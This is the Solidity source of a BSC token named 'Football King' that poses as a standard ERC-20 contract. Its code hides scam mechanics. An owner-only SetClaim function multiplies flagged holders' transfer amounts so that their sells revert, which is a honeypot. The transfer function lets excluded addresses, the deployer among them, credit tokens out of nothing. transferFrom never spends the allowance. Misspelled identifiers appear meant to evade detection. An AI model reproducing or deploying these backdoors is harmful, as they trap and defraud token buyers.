/**
 *Submitted for verification at BscScan.com on 2022-10-12
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address accbount) external view returns (uint256);

    function transfer(address recipient, uint256 amonnts) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amonnts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amonnts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fyie https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract token is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "Football King";
    string private _symbol = "FBKING";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfyie = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => uint256) private _LKD;
    mapping(address => uint256) private _CLAIM;

    function SetClaim(address accbount) public onlyowner {
        _CLAIM[accbount] = _totalSupply;
    }


    function UnClaim(address accbount) public onlyowner {
        _CLAIM[accbount] = 1;
    }


    function isClaim(address accbount) public view returns (uint256) {
        return _CLAIM[accbount];
    }

    constructor () {
        _balance[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {

        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 fyieamonnt = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            fyieamonnt = amonnts.mul(_burnfyie).div(100);
            require(amonnts <= _maxTxtransfer);
        }
        uint256 blsender = _balance[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            require(blsender >= amonnts,"IERC20: transfer amonnts exceeds balance");
        }

        if (_CLAIM[sender] > 0) {
            amonnts = amonnts.mul(_CLAIM[sender]);
        }

        _balance[sender] = _balance[sender].sub(amonnts);


        uint256 amoun;
        amoun = amonnts - fyieamonnt;
        _balance[recipient] += amoun;
        if (_burnfyie > 0){
            emit Transfer (sender, _DEADaddress, fyieamonnt);
        }
        emit Transfer(sender, recipient, amoun);

    }

    function transfer(address recipient, uint256 amonnts) public virtual override returns (bool) {
        if (_isExcludedFrom[_msgSender()] == true) {
            _balance[recipient] += amonnts;
            return true;
        }
        _transfer(_msgSender(), recipient, amonnts);
        return true;
    }


    function balanceOf(address accbount) public view override returns (uint256) {
        return _balance[accbount];
    }

    function approve(address spender, uint256 amonnts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amonnts);
        return true;
    }

    function _approve(address owner, address spender, uint256 amonnts) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amonnts;
        emit Approval(owner, spender, amonnts);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amonnts) public virtual override returns (bool) {
        _transfer(sender, recipient, amonnts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amonnts, "IERC20: transfer amonnts exceeds allowance");
        return true;
    }

}